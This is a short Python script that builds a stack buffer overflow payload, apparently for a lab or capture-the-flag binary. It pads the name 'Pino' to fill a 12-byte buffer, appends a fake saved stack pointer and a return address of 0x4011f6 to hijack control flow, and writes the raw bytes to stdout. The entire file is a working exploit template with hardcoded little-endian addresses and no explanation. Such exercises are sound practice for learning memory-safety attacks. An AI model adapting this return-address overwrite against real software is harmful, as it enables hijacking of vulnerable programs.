#!/usr/bin/python3

import sys

addr_size = 8
buff_size = 0xc
fake_stack = (0x7fffffffd448).to_bytes(addr_size,byteorder='little')
f_addr = (0x00000000004011f6).to_bytes(addr_size,byteorder='little')

def pad(s, l):
    b = s.encode()
    return b + (b'\0' * (l-len(b)))

name = "Pino"

fake = pad(name, buff_size) + fake_stack + f_addr
print(len(fake))
sys.stdout.buffer.write(fake)
